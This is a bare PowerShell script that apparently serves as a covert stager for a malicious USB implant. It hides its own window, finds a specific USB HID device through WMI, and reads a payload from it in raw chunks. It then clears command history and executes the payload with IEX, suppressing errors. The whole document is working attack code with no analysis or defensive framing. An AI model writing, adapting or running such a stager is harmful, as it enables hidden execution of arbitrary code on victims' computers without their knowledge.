$u=$Host.UI.RawUI
$u.ForegroundColor=$u.BackgroundColor
Clear

$u.WindowTitle=''
$M=64
$cs='
using System;
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
namespace n{public class w{[DllImport(%kernel32.dll%)]
public static extern SafeFileHandle CreateFile(String x,UInt32 d,Int32 s,IntPtr a,Int32 c,uint b,IntPtr t);
[DllImport(%user32.dll%)]
public static extern bool ShowWindowAsync(IntPtr h,int c);
[DllImport(%user32.dll%)]
public static extern IntPtr SetWindowPos(IntPtr h,int i,int x,int Y,int c,int j,int w);

public static FileStream o(string f){return new FileStream(CreateFile(f,0XC0000000U,3,IntPtr.Zero,3,0x40000000,IntPtr.Zero),FileAccess.ReadWrite,9,true);}}}'.Replace('%',[char]34)
Add-Type -TypeDefinition $cs
$h=(Get-Process -Id $pid).MainWindowHandle
$null=[n.w]::SetWindowPos($h,-2,2000,2000,40,40,5)

function x(){$null=[n.w]::ShowWindowAsync($h,0)
$d=gwmi Win32_USBControllerDevice
foreach($h in $d){$w=[wmi]$h.Dependent
if($w.GetPropertyValue('DeviceID')-match('03EB&PID_2066')-and($w.GetPropertyValue('Service')-eq$null)){$fn=([char]92+[char]92+'?'+[char]92+$w.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35)+[char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')}}try{$f=[n.w]::o($fn)
$g=$e=0
$s=New-Object IO.MemoryStream
do{$b=New-Object Byte[]($M+1)
$f.Write($b,0,$M+1)
$r=$f.Read($b,0,$M+1)
if($b[1]-gt0){$s.Write($b,2,$b[1])
$g+=$b[1]
$a=$s.ToArray()
if($e-eq0-and$g-gt2){$e=($a[0]*256)+$a[1]}}}while($g-lt$e+2-or$e-eq0)
clhy
IEx([Text.Encoding]::ASCII).GetString($a,2,$e)}catch{}exit}x

